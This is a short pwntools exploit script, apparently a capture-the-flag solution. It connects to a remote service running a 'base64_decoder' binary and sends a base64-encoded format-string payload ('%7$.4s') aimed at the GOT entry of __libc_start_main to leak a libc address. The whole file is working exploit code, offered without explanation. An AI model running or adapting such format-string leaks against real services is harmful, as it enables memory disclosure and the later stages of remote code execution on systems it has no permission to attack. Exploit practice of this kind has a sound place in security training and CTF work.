from pwn import *
import base64

context.log_level = 'debug'

r = remote('111.230.149.72', 10013)
elf = ELF('./base64_decoder')

libc_main = elf.got['__libc_start_main']

payload = p32(libc_main) + "%7$.4s"
payload = base64.b64encode(payload)
r.recvuntil(">")
r.sendline(payload)
r.recvuntil(">")
r.close()

